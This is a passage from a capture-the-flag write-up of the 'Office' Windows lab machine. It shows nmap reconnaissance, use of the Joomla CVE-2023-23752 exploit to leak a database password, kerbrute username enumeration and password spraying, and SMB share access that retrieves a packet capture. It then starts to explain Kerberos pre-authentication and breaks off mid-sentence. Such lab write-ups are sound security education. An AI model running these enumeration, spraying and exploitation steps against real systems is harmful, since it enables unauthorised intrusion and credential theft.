---
description: 'Platform: Windows - Difficulty: Hard'
---

# 🟥 OFFICE

## RECON

### Nmap

```bash
nmap -sV -sC -p- -v 10.129.125.2
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-19 16:44 GMT
NSE: Loaded 155 scripts for scanning.

Scanning 10.129.125.2 [65535 ports]
Discovered open port 80/tcp on 10.129.125.2
Discovered open port 445/tcp on 10.129.125.2
Discovered open port 139/tcp on 10.129.125.2
Discovered open port 443/tcp on 10.129.125.2
Discovered open port 53/tcp on 10.129.125.2
Discovered open port 3268/tcp on 10.129.125.2
Discovered open port 49669/tcp on 10.129.125.2
Discovered open port 464/tcp on 10.129.125.2
Discovered open port 5985/tcp on 10.129.125.2
Discovered open port 9389/tcp on 10.129.125.2
Discovered open port 58018/tcp on 10.129.125.2
Discovered open port 88/tcp on 10.129.125.2
Discovered open port 389/tcp on 10.129.125.2
Discovered open port 593/tcp on 10.129.125.2
Discovered open port 49679/tcp on 10.129.125.2
Discovered open port 3269/tcp on 10.129.125.2
Discovered open port 49664/tcp on 10.129.125.2
Discovered open port 58000/tcp on 10.129.125.2
Discovered open port 636/tcp on 10.129.125.2
Completed Connect Scan at 16:46, 105.14s elapsed (65535 total ports)
Initiating Service scan at 16:46
Scanning 19 services on 10.129.125.2
Completed Service scan at 16:47, 53.59s elapsed (19 services on 1 host)
NSE: Script scanning 10.129.125.2.
Initiating NSE at 16:47
Completed NSE at 16:47, 40.27s elapsed
Initiating NSE at 16:47
Completed NSE at 16:47, 1.47s elapsed
Initiating NSE at 16:47
Completed NSE at 16:47, 0.00s elapsed
Nmap scan report for 10.129.125.2
Host is up (0.022s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-20 00:45:57Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername:<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83fab78db28734dde8411e9420f8878
|_SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
|_SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername:<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83fab78db28734dde8411e9420f8878
|_SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername:<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83fab78db28734dde8411e9420f8878
|_SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername:<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83fab78db28734dde8411e9420f8878
|_SHA-1: 36c4cedf91853d4c598c739a8bc7a0624458cfe4
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58000/tcp open  msrpc         Microsoft Windows RPC
58018/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m34s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-20T00:46:49
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 16:47
Completed NSE at 16:47, 0.00s elapsed
Initiating NSE at 16:47
Completed NSE at 16:47, 0.00s elapsed
Initiating NSE at 16:47
Completed NSE at 16:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.84 seconds
```

Another AD machine? Not again?????

### Web Enumeration

`ffuf` and `dirbuster` return no interesting subdomains.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>Overlook of office.htb</p></figcaption></figure>

Wow, hell of a web. Wappalyzer found the CMS for it is Joomla.

{% hint style="info" %}
Joomla is a powerful, open-source content management system (CMS) that allows users to easily create and manage websites.

It was first launched in 2005 and has since become one of the most widely used CMS platforms on the internet. With its drag-and-drop interface, Joomla makes it easy for even non-technical users to create professional-looking websites in no time (LOL).
{% endhint %}

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>Not expecting that?</p></figcaption></figure>

For a typical run on a box, I would check for `robots.txt` and `sitemap`, and take a look of this picture:

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption><p>Juicy info!!!</p></figcaption></figure>

So `/administrator` basically leads us right to the login portal for the Joomla! Administrator Login

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>Right now, we don't have the creds for it. Saved it for later!</p></figcaption></figure>

## GAINING FOOTHOLD

After a look through the version of this CMS, it is apparently that it was vulnerable to [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752)

{% hint style="warning" %}
Joomla's access control to web service endpoints has this vulnerability that potentially allowing unauthenticated attackers to utilize specially crafted requests to access the RestAPI interface and obtain configuration information related to Joomla. This ultimately results in the disclosure of sensitive data.
{% endhint %}

Got some info from this [tool](https://github.com/Acceis/exploit-CVE-2023-23752):

```
[474] Tony Stark (Administrator) - Administrator@holography.htb - Super Users

Site info
Site name: Holography Industries
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: root
DB password: H0lOgrams4reTakIng0Ver754!
DB name: joomla_db
DB prefix: if2tx_
DB encryption 0
```

Our scan did not reveal a MySQL database; it could be running on localhost. With this credential, there has been no successful login to the SMB port or the login portal.

Now, let's enumerate for valid AD accounts through [kerbrute](https://github.com/ropnop/kerbrute):

```
kerbrute userenum -d office.htb --dc 10.129.224.247 /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/27/24 - Ronnie Flathers @ropnop

2024/02/27 12:38:42 >  Using KDC(s):
2024/02/27 12:38:42 >  	10.129.224.247:88

2024/02/27 12:38:43 >  [+] VALID USERNAME:	 administrator@office.htb
2024/02/27 12:38:46 >  [+] VALID USERNAME:	 Administrator@office.htb
2024/02/27 12:38:47 >  [+] VALID USERNAME:	 ewhite@office.htb
2024/02/27 12:38:47 >  [+] VALID USERNAME:	 etower@office.htb
2024/02/27 12:38:47 >  [+] VALID USERNAME:	 dwolfe@office.htb
2024/02/27 12:38:47 >  [+] VALID USERNAME:	 dlanor@office.htb
2024/02/27 12:38:47 >  [+] VALID USERNAME:	 dmichael@office.htb
2024/02/27 12:39:29 >  [+] VALID USERNAME:	 hhogan@office.htb
2024/02/27 12:39:40 >  [+] VALID USERNAME:	 DWOLFE@office.htb
2024/02/27 12:42:21 >  [+] VALID USERNAME:	 DLANOR@office.htb
2024/02/27 12:45:12 >  [+] VALID USERNAME:	 tstark@office.htb
```

Using the previous credential to bruteforce together with the list of usernames:

```
kerbrute passwordspray -d office.htb --dc 10.10.11.3 usernames.txt H0lOgrams4reTakIng0Ver754!

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/27/24 - Ronnie Flathers @ropnop

[+] VALID LOGIN WITH ERROR:       dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!    (Clock skew is too great)
Done! Tested 11 logins (1 successes) in 0.445 seconds
```

So, with this, we can have a deeper look on SMB:

```
smbclient -U dwolfe@office.htb%H0lOgrams4reTakIng0Ver754! -L //10.129.224.247

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SOC Analysis    Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

smbclient -U dwolfe@office.htb%H0lOgrams4reTakIng0Ver754! //10.129.224.247/SOC\ Analysis
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed May 10 19:52:24 2023
  ..                                DHS        0  Wed Feb 14 10:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 01:59:00 2023

		6265599 blocks of size 4096. 1124266 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (31178.6 KiloBytes/sec) (average 31178.7 KiloBytes/sec)
smb: \> exit
```

Discovering an intriguing PCAP file while browsing the shares, so let's take a closer look at it.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>Wow!!</p></figcaption></figure>

### GETTING CREDENTIAL THROUGH KERBEROS PRE-AUTHENTICATION PACKET

In Microsoft Active Directory, Kerberos is the most widely used authentication protocol. In daily usage, it has largely replaced New Technology LAN Manager. The main benefit of Kerberos is that it is far more secure than NTLM.

In a nutshell, the most significant aspect of Kerberos is that it makes use of tickets that domain users can use to authenticate with the Authentication Service (AS) and the Key Distribution Center (KDC). The domain controllers of a domain are typically home to the Kerberos service (KDC & AS).

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption><p>A simple diagram to show how Kerberos Authentication works.</p></figcaption></figure>

Without pre-authentication, we only receive some data that has been encrypted using the user's password as the encryption key. We do not actually receive the user's password or even a hash. The encrypted data is then bruteforced using a wordlist until a password is found in the list that, when used to decrypt the encrypted data, results in useable data.

{% hint style="info" %}
And because of this, the original Kerberos 4 protocol was vulnerable to offline dictionary and brute force attacks. So, in the next iteration, Kerberos 5 introduced Pre-Authentication.
{% endhint %}

When pre-authentication is turned on, a user sends an authentication server request (AS-REQ) message to the domain controller (DC) in order to initiate the Kerberos authentication process. As part of the AS-REQ packet, it encrypts the current time and sends it to the server. **The encryption key used is the user's password**.

\-> So&#x20;





